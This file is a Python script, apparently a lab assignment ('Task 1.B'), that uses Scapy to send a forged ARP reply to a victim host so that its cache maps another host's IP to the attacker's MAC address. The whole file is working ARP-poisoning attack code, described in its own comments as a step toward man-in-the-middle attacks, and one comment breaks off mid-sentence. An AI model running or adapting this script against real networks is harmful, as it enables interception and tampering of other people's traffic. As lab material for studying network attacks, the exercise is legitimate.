#!/usr/bin/env python3
from scapy.all import Ether, ARP, sendp
import time

# --- Configuration ---
IP_A_TARGET = "10.9.0.6"           # Host A's IP (the victim)
MAC_A_TARGET = "02:42:0a:09:00:06" # Host A's MAC

IP_B_SPOOFED = "10.9.0.5"          # Host B's IP (the IP we are claiming to be)

MAC_M_ATTACKER = "02:42:0a:09:00:69"

def send_arp_reply():
    """
    Constructs and sends a single ARP reply packet to poison Host A's cache.
    Host A will be told that IP_B_SPOOFED is at MAC_M_ATTACKER.
    """
    print(f"[*] Sending ARP Reply to {IP_A_TARGET} ({MAC_A_TARGET})")
    print(f"[*] Spoofing: {IP_B_SPOOFED} is at {MAC_M_ATTACKER}")

    ether_frame = Ether(dst=MAC_A_TARGET, src=MAC_M_ATTACKER)

    arp_packet = ARP(op=2, # ARP Reply
                      hwsrc=MAC_M_ATTACKER,
                      psrc=IP_B_SPOOFED,
                      hwdst=MAC_A_TARGET,
                      pdst=IP_A_TARGET)

    packet = ether_frame / arp_packet


    try:
        sendp(packet, verbose=False)
        print("[+] ARP Reply packet sent successfully.")
    except Exception as e:
        print(f"[!] Error sending packet: {e}")

if __name__ == "__main__":
    # This script will send one ARP reply packet.
    # For continuous poisoning (as often needed in MITM attacks),

    print("--- ARP Poisoning Script (Task 1.B - ARP Reply) ---")
    send_arp_reply()

